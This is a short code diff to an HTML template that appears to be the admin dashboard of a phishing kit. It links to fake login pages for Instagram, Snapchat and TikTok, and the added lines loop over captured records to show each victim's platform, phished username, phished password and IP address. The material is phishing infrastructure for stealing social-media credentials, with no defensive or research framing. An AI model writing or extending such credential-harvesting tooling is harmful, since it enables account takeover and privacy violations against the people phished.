@@ -84,7 +84,10 @@
               <a href="/instagram/login">Instagram add</a> <br />
               <a href="/snapchat/login">Snapchat add</a> <br />
               <a href="/tiktok/login">Tik Tok add</a> <br />
-              <h2>some more shit here</h2>
+              <h1>Your accounts</h1>
+              {% for user in users %}
+                <p>{{user.platform}} # {{user.phised_user}} # {{user.phished_pword}} # {{user.ip}}</p>
+              {% endfor %}
             </div>
           </div>
           <!-- <div class="row">
